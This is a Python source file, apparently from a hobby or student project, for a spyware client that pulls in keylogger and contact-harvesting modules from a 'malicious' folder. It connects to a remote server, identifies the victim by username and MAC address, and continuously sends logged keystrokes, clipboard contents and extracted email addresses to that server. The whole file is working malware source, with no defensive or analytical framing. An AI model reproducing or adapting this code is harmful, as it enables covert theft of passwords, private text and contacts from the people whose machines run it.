"""
Edan Jacobson
Client that sends key logs and contacts to server
"""

import os
import sys

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'malicious')))

import threading
import uuid
from socket import socket, error, AF_INET, SOCK_STREAM
from constants import EXIT, CLIENT_IP, PORT, NO_DATA, CHARS, FIRST, RANGE_POS_1, RANGE_POS_2, RANGE_POS_3
import keylogger
from protocol import Protocol
import contacts


class Client:
    def __init__(self, ip, port):
        """
        Constructor method for Client
        """
        msg_printed = False
        connected = False
        try:
            try:
                self.contacts = contacts.Contacts()
                self.contacts.get_email_addresses()
            except Exception as msg:
                print(msg)
            while not connected:
                try:
                    self.client_socket = socket(AF_INET, SOCK_STREAM)
                    self.client_socket.connect((ip, port))
                except Exception as msg:
                    if not msg_printed:
                        print("couldn't connect to server")
                else:
                    connected = True
            self.login()
            self.keylogger = keylogger.Keylogger()
            self.output()
        except error as msg:
            print(f"Connection failure: {msg}\n terminating program")
            sys.exit(EXIT)

    def output(self):
        """
        Sends contacts and starts a thread for handling keylogger output
        """
        handle_keylogger_output_thread = threading.Thread(
            target=self.handle_output)
        handle_keylogger_output_thread.start()

    def handle_output(self):
        """
        Sends keylogger and clipboard data to the server
        Sends email addresses to server
        """
        sent = False
        while True:
            logged_data = self.keylogger.__getattribute__("logged_data")
            if len(logged_data) > NO_DATA:
                for data in logged_data:
                    print("sent", data )
                    Protocol.send(self.client_socket, "KEYLOGGER:" + data)
                    self.keylogger.remove_logged()
            clipboard_data = self.keylogger.__getattribute__("copied_data")
            if len(clipboard_data) > NO_DATA:
                for data in clipboard_data:
                    print("sent", data )
                    Protocol.send(self.client_socket, "CLIPBOARD:" + data)
                    self.keylogger.remove_copied()
            if not sent and self.contacts.finished_extracting:
                self.send_contacts()
                sent = True

    def send_contacts(self):
        """
        Sends email addresses to the server
        """
        text = "\n".join(self.contacts.__getattribute__("email_addresses"))
        split_text = [text[i:i + CHARS] for i in range(FIRST, len(text), CHARS)]
        for text in split_text:
            print("sent", split_text)
            Protocol.send(self.client_socket, f"contacts:{text}")

    def login(self):
        """
        Sends login information to the server
        """
        username = os.getlogin() + '-' + self.get_mac_address()
        Protocol.send(self.client_socket, f"login:{username}")

    @staticmethod
    def get_mac_address():
        """
        Returns the MAC address of the client
        """
        mac = ''.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in
                       range(RANGE_POS_1, RANGE_POS_2, RANGE_POS_3)])
        return mac


def main():
    """
    Constructs a client and runs it
    """
    Client(CLIENT_IP, PORT)


if __name__ == '__main__':
    try:
        main()
    except (KeyboardInterrupt, SystemExit) as e:
        print("Brutal exit", e)